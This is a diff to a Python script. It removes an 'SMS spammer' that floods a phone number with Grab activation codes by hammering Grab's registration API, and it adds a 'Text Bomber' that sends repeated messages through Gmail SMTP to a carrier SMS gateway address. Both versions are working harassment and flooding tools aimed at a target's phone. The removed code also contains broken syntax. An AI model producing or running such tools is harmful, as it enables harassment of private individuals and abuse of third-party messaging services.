@@ -1,69 +1,23 @@
-#!/usr/bin/python
-
-# - Spammer
-# | Description: spams a phone number by sending it a lot of sms by using Grab API
-# | Author: P4kL0nc4t
-# | Date: 4/11/2017
-
-print """\
-   ____                             
-  / __/__  ___ ___ _  __ _  ___ ____
- _\ \/ _ \/ _ `/  ' \/  ' \/ -_) __/
-/___/ .__/\_,_/_/_/_/_/_/_/\__/_/   
-   /_/  P4kL0nc4t Spammer (GRAB)
-"""
-import requests
-import datetime
-import sys
+## Mr.BIN Text Bomber ##
 import time
-import argparse
-
-parser = argparse.ArgumentParser(prog="Spammer", description="Spammer is a tool used to send Grab Activation Code (SMS) to a phone number repeatedly. Spammer uses Grab's passenger API.", epilog="If you had stuck, you can mail me at p4kl0nc4t@obsidiancyberteam.id")
-parser.add_argument("phonenum", metavar="phone", help="the phone number to send the GAC SMS. (example: 6285237048641)")
-args = parser.parse_args()
-
-def showstatus(message, type="new"):
-	now = datetime.datetime.now().strftime("%H:%M:%S")
-	icon = "*"
-	if type == "warn":
-		icon = "!"
-	elif type == "new":
-		icon == "*"
-	message = "[" + icon + "][" + now + "]" + message
-	return message
-
-def wrapsbrace(string, endspace=False):
-	if endspace == True:
-		return "[" + string + "] "
-	else:
-		return "[" + string + "]"
-def sleep(1):
-	try:
-		time.sleep(1)
-	except KeyboardInterrupt:
-		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
-		exit()
-
-_phone = args.phonenum
-iteration = 1
-print showstatus(wrapsbrace("info", True) + "Send GAC SMS to: {}".format(_phone))
-while True:
-	try:
-		r = requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
-	except KeyboardInterrupt:
-		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
-		exit()
-	except requests.exceptions.ConnectionError:
-		print showstatus(wrapsbrace("except", True) + "ConnectionError thrown! Sleeping for 1s . . .", "warn")
-		sleep(1)
-	else:
-		if r.status_code == 429:
-			print showstatus(wrapsbrace("429 {}".format(r.reason), True) + "Sleeping for 1s . . .", "warn")
-			sleep(1)
-		elif r.status_code == 200:
-			print showstatus(wrapsbrace("200 OK", True) + "GAC SMS sent! Sleeping for 1s . . . (iteration:{})".format(iteration))
-			iteration += 1
-			sleep(1)
-		else:
-			print showstatus(wrapsbrace("{} {}".format(r.status_code, r.reason), True) + "Something went wrong. Exiting . . .", "warn")
-			exit()
+import smtplib
+#CONFIG. You can change any of the values on the right.
+email_provider = 'smtp.gmail.com' #server for your email- see ReadMe on github
+email_address = "YourEmail@gmail.com" #your email
+email_port = 587 #port for email server- see ReadMe on github
+password = "password123" #your email password
+msg = "Your message that you want sent to target" #your txt message
+text_amount = 20 #amount sent
+target_email = "5551234567@mms.att.net" #target number. must be in email form- see ReadMe on github
+wait = 1 #seconds in between messages
+#END CONFIG
+### DO NOT EDIT BELOW THIS LINE ###
+server = smtplib.SMTP(email_provider, email_port)
+server.starttls()
+server.login(email_address, password)
+for _ in range(0,text_amount):
+    server.sendmail(email_address,target_email,msg)
+    print("sent")
+    time.sleep(wait)
+print("{} texts were sent. Hope you had a good time ;)".format(text_amount))
+server.quit()
